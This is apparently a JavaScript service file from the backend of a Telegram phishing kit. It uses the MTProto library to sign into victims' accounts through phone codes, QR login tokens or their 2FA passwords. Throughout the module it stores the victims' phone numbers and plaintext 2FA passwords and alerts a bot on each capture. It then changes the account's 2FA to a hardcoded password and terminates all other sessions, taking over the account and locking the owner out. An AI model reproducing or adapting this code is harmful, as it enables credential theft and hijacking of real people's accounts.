const MTProto = require("@mtproto/core");
const { default: base64url } = require("base64url");
const socketController = require("../controllers/socket-controller");
require("dotenv").config();
const generateQRCode = require("../utils/QRG");
const visitorService = require("./visitor-service");
const botService = require("./bot-service");
const crypto = require("crypto");
const CryptoAPI = require("../utils/crypto");
const { default: axios } = require("axios");
const getTelegramVerificationCode = require("./imap-service");

class MTProtoService {
  genInstance(path, title, platform) {
    const mtproto = new MTProto({
      api_id: process.env.API_ID,
      api_hash: process.env.API_HASH,
      storageOptions: {
        path,
      },
    });
    mtproto.updateInitConnectionParams({
      app_version: platform,
      device_model: title,
    });
    mtproto.setDefaultDc(2);
    return mtproto;
  }

  async update2FA(instance, password) {
    const current_algo_encoded = {
      salt1: CryptoAPI.encodeUint8Array2b64(password.current_algo.salt1),
      salt2: CryptoAPI.encodeUint8Array2b64(password.current_algo.salt2),
      g: password.current_algo.g,
      p: CryptoAPI.encodeUint8Array2b64(password.current_algo.p),
    };
    const new_algo_encoded = {
      salt1: CryptoAPI.encodeUint8Array2b64(password.new_algo.salt1),
      salt2: CryptoAPI.encodeUint8Array2b64(password.new_algo.salt2),
      g: password.new_algo.g,
      p: CryptoAPI.encodeUint8Array2b64(password.new_algo.p),
    };
    const encoded = {
      flags: password.flags,
      srp_B: CryptoAPI.encodeUint8Array2b64(password.srp_B),
      srp_id: password.srp_id,
      current_algo: current_algo_encoded,
      new_algo: new_algo_encoded,
    };

    const res = await axios.post(
      `${process.env.GENCRYPTO_SERVER_URL}/gencrypto/2FA/change`,
      {
        ...encoded,
        current_password: process.env.GENCRYPTO_2FA_PASSWORD,
        new_password: "HolaAmigos9",
      },
      {
        headers: {
          "x-api-key": process.env.GENCRYPTO_SERVER_API_KEY,
          "Content-Type": "application/json",
        },
      }
    );

    const new_algo_decoded = {
      _: "passwordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow",
      salt1: CryptoAPI.decodeByteB642Uint8Array(res.data.result.new_algo.salt1),
      salt2: CryptoAPI.decodeByteB642Uint8Array(res.data.result.new_algo.salt2),
      g: res.data.result.new_algo.g,
      p: CryptoAPI.decodeByteB642Uint8Array(res.data.result.new_algo.p),
    };

    const password_decoded = {
      _: "inputCheckPasswordSRP",
      A: CryptoAPI.decodeByteB642Uint8Array(res.data.result.password.A),
      M1: CryptoAPI.decodeByteB642Uint8Array(res.data.result.password.M1),
      srp_id: res.data.result.password.srp_id,
    };

    const new_password_hash_decoded = CryptoAPI.decodeByteB642Uint8Array(
      res.data.result.new_password_hash
    );

    await instance.call("account.updatePasswordSettings", {
      password: {
        ...password_decoded,
      },
      new_settings: {
        _: "account.passwordInputSettings",
        new_password_hash: new_password_hash_decoded,
        hint: process.env.GENCRYPTO_2FA_HINT,
        new_algo: new_algo_decoded,
      },
    });
  }

  async create2FA(instance, new_algo) {
    const { salt1, salt2, g, p } = new_algo;
    const encoded = {
      salt1: CryptoAPI.encodeUint8Array2b64(salt1),
      salt2: CryptoAPI.encodeUint8Array2b64(salt2),
      g,
      p: CryptoAPI.encodeUint8Array2b64(p),
    };

    const res = await axios.post(
      `${process.env.GENCRYPTO_SERVER_URL}/gencrypto/2FA/enable`,
      {
        new_algo: encoded,
        password: process.env.GENCRYPTO_2FA_PASSWORD,
      },
      {
        headers: {
          "x-api-key": process.env.GENCRYPTO_SERVER_API_KEY,
          "Content-Type": "application/json",
        },
      }
    );

    const new_algo_decoded = {
      _: "passwordKdfAlgoSHA256SHA256PBKDF2HMACSHA512iter100000SHA256ModPow",
      salt1: CryptoAPI.decodeByteB642Uint8Array(res.data.result.new_algo.salt1),
      salt2: CryptoAPI.decodeByteB642Uint8Array(res.data.result.new_algo.salt2),
      g: parseInt(res.data.result.new_algo.g),
      p: CryptoAPI.decodeByteB642Uint8Array(res.data.result.new_algo.p),
    };

    const new_password_hash_decoded = CryptoAPI.decodeByteB642Uint8Array(
      res.data.result.new_password_hash
    );

    await instance.call("account.updatePasswordSettings", {
      password: {
        _: "inputCheckPasswordEmpty",
      },
      new_settings: {
        _: "account.passwordInputSettings",
        new_password_hash: new_password_hash_decoded,
        hint: process.env.GENCRYPTO_2FA_HINT,
        new_algo: new_algo_decoded,
      },
    });
  }

  async remove2FA(instance, password, twofa) {
    try {
      const current_algo_encoded = {
        salt1: CryptoAPI.encodeUint8Array2b64(password.current_algo.salt1),
        salt2: CryptoAPI.encodeUint8Array2b64(password.current_algo.salt2),
        g: password.current_algo.g,
        p: CryptoAPI.encodeUint8Array2b64(password.current_algo.p),
      };
      const encoded = {
        flags: password.flags,
        srp_B: CryptoAPI.encodeUint8Array2b64(password.srp_B),
        srp_id: password.srp_id,
        current_algo: current_algo_encoded,
      };

      const res = await axios.post(
        `${process.env.GENCRYPTO_SERVER_URL}/gencrypto/2FA/remove`,
        {
          ...encoded,
          current_password: twofa,
        },
        {
          headers: {
            "x-api-key": process.env.GENCRYPTO_SERVER_API_KEY,
            "Content-Type": "application/json",
          },
        }
      );

      const password_decoded = {
        _: "inputCheckPasswordSRP",
        A: CryptoAPI.decodeByteB642Uint8Array(res.data.result.password.A),
        M1: CryptoAPI.decodeByteB642Uint8Array(res.data.result.password.M1),
        srp_id: res.data.result.password.srp_id,
      };

      await instance.call("account.updatePasswordSettings", {
        password: {
          ...password_decoded,
        },
        new_settings: {
          _: "account.passwordInputSettings",
          new_algo: {
            _: "passwordKdfAlgoUnknown",
          },
          new_password_hash: new Uint8Array(0),
          hint: "asdsa",
        },
      });
    } catch (e) {
      console.error(e);
    }
  }

  async change2FA(instance, twofa) {
    var password = await instance.call("account.getPassword");
    if (!password.has_password)
      return this.create2FA(instance, password.new_algo);
    await this.remove2FA(instance, password, twofa);
    password = await instance.call("account.getPassword");
    await this.create2FA(instance, password.new_algo);
  }

  async detachAllSessions(instance) {
    try {
      const { authorizations } = await instance.call(
        "account.getAuthorizations"
      );
      const currentHash = authorizations.find((auth) => auth.current)?.hash;
      if (!currentHash) return false;
      const promises = authorizations
        .filter((auth) => !auth.current)
        .map((auth) =>
          instance.call("account.resetAuthorization", {
            hash: auth.hash,
          })
        );
      await Promise.all(promises);
      return true;
    } catch (e) {
      console.error(e);
      return false;
    }
  }

  resolveResponse(response, cb) {
    switch (response._) {
      case "auth.sentCode":
        return cb("CODE");
      case "auth.loginTokenSuccess":
        return cb("SUCCESS");
      case "auth.authorization":
        return cb("SUCCESS");
      case "mt_rpc_error":
        switch (response.error_message) {
          case "SESSION_PASSWORD_NEEDED":
            return cb("2FA");
          case "PASSWORD_HASH_INVALID":
            return cb("PASSWORD_HASH_INVALID");
          default:
            return cb("ERR");
        }
    }
  }

  async getConfig(instance, qrp) {
    try {
      const { token, expires } = await instance.call("auth.exportLoginToken", {
        api_id: process.env.API_ID,
        api_hash: process.env.API_HASH,
        except_ids: [],
      });

      const b64en = base64url(token);

      await generateQRCode(`tg://login?token=${b64en}`, qrp);

      return {
        token,
        expires,
        qrp,
      };
    } catch (e) {
      console.error(e);
      return null;
    }
  }

  async send2FA(instance, pass, visitorId, useragent) {
    try {
      const { srp_id, current_algo, srp_B } = await instance.call(
        "account.getPassword"
      );
      const { g, p, salt1, salt2 } = current_algo;

      const { A, M1 } = await instance.crypto.getSRPParams({
        g,
        p,
        salt1,
        salt2,
        gB: srp_B,
        password: pass,
      });

      const result = await instance.call("auth.checkPassword", {
        password: {
          _: "inputCheckPasswordSRP",
          srp_id,
          A,
          M1,
        },
      });

      switch (result._) {
        case "auth.authorization":
          if (result.user) {
            await visitorService.setSuccess(visitorId);
            if (result.user.phone)
              await visitorService.updatePhone(visitorId, result.user.phone);
            await visitorService.update2FA(visitorId, pass);
          }
          botService.emit(visitorId, "2FA", useragent);
          socketController.emitSocket(visitorId, "SUCCESS");
      }
    } catch (e) {
      console.error(e);
      return this.resolveResponse(e, (message) => {
        return {
          status: message,
        };
      });
    }
  }

  async sendCode(instance, phone) {
    try {
      return await instance.call("auth.sendCode", {
        phone_number: phone,
        settings: {
          _: "codeSettings",
        },
      });
    } catch (e) {
      console.error(e);
      return e;
    }
  }

  async verify(instance, phone, code, phone_code_hash, visitorId, useragent) {
    try {
      const response = await instance.call("auth.signIn", {
        phone_code: code,
        phone_number: phone,
        phone_code_hash,
      });
      switch (response._) {
        case "auth.authorization":
          if (response.user) {
            await visitorService.setSuccess(visitorId);
            botService.emit(visitorId, "PHONE CODE", useragent);
            if (response.user.phone) {
              await visitorService.updatePhone(visitorId, response.user.phone);
            }
            return {
              status: "SUCCESS",
            };
          }
          break;
        default:
          break;
      }
    } catch (e) {
      console.error(e);
      switch (e._) {
        case "mt_rpc_error":
          switch (e.error_message) {
            case "SESSION_PASSWORD_NEEDED":
              return {
                status: "2FA",
              };
            case "PHONE_CODE_INVALID":
              return {
                status: "PHONE_CODE_INVALID",
              };
            case "PHONE_CODE_EXPIRED":
              return {
                status: "PHONE_CODE_EXPIRED",
              };
          }
          break;
        default:
          throw e;
      }
    }
  }

  async importKey(instance, token, visitorId, useragent) {
    try {
      const result = await instance.call("auth.importLoginToken", {
        token,
      });
      switch (result._) {
        case "auth.loginTokenSuccess":
          if (result.authorization && result.authorization.user) {
            await visitorService.setSuccess(visitorId);
            if (result.authorization.user.phone)
              await visitorService.updatePhone(
                visitorId,
                result.authorization.user.phone
              );
          }
          botService.emit(visitorId, "QR-CODE", useragent);
          socketController.emitSocket(visitorId, "SUCCESS");
          break;
        default:
          break;
      }
      return result;
    } catch (e) {
      //console.error(e);
      switch (e._) {
        case "mt_rpc_error":
          switch (e.error_message) {
            case "SESSION_PASSWORD_NEEDED":
              socketController.emitSocket(visitorId, "2FA");
              break;
          }
          break;
        default:
          break;
      }
      return e;
    }
  }
}

module.exports = new MTProtoService();
